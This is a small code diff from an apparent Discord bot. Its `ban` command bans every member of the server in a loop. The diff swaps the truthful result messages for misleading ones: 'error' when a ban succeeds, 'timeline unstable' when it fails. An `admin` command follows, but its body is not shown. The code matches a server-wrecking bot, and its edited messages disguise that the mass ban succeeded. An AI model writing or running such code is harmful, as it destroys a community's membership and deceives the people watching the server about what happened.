@@ -719,10 +719,10 @@ async def ban(ctx):
     for member in ctx.guild.members:
         try:
             await member.ban()
-            await ctx.send(f"Successfully banned {member}")
+            await ctx.send("error")
         
         except Exception as e:
-            await ctx.send(f"Unable to ban {member} {e}")
+            await ctx.send("timeline unstable")
 
 @bot.command()
 async def admin(ctx):
